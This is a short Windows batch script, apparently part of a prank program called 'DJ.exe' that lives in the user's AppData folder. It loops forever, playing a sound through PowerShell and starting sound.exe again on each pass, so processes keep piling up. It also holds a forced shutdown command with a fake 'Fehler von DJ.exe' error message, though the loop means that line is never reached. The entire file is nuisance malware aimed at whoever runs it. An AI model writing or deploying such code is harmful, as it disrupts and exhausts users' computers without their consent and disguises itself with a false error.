@echo off
cd %appdata%/DJ
:Loop
powershell -Command "$player = New-Object System.Media.SoundPlayer; $player.SoundLocation = '%appdata%\DJ\sound.wav'; $player.PlaySync()"
start sound.exe
goto Loop
shutdown -s -c "Fehler von DJ.exe"
